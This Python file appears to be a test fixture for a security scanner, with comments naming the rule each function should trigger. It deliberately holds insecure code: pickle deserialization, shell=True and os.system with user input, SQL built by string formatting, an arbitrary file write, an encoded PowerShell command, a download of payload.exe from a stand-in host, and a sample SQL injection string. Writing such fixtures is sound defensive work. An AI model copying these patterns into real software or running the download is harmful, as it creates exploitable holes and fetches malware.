"""
This is a demonstration file with intentionally unsafe Python code.
DO NOT USE THIS IN PRODUCTION - FOR TESTING ONLY
"""

import pickle
import base64
import subprocess
import os
import sys

# Unsafe deserialization (should trigger PYTHON-UNSAFE-DESERIALIZE)
def load_pickled_data(data_file):
    with open(data_file, 'rb') as f:
        data = pickle.load(f)  # Unsafe deserialization
    return data

# Dangerous subprocess execution (should trigger SUSPICIOUS-EXEC)
def execute_command(cmd):
    return subprocess.call(cmd, shell=True)  # Dangerous - allows shell injection

# Base64 encoded PowerShell (should trigger ENCODED-POWERSHELL)
def run_encoded_powershell():
    # Base64 encoded "Get-Process"
    encoded_cmd = "RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="
    powershell_cmd = f"powershell.exe -EncodedCommand {encoded_cmd}"
    os.system(powershell_cmd)

# Suspicious download (should trigger SUSPICIOUS-DOWNLOAD)
def download_payload():
    import urllib.request
    url = "https://suspicious-domain.com/payload.exe"
    urllib.request.urlretrieve(url, "payload.exe")

# Function that combines multiple unsafe operations
def unsafe_operations(user_input):
    # Potential SQL injection
    query = f"SELECT * FROM users WHERE username = '{user_input}'"
    
    # Command injection
    os.system(f"ping {user_input}")
    
    # Arbitrary file write
    with open(user_input, 'w') as f:
        f.write("Compromised")
    
    return query

if __name__ == "__main__":
    # Uncomment to execute the functions (for testing)
    # load_pickled_data("data.pkl")
    # execute_command("whoami")
    # run_encoded_powershell()
    # download_payload()
    # unsafe_operations(sys.argv[1] if len(sys.argv) > 1 else "admin' OR '1'='1")
    print("This file contains intentionally unsafe code patterns for testing") 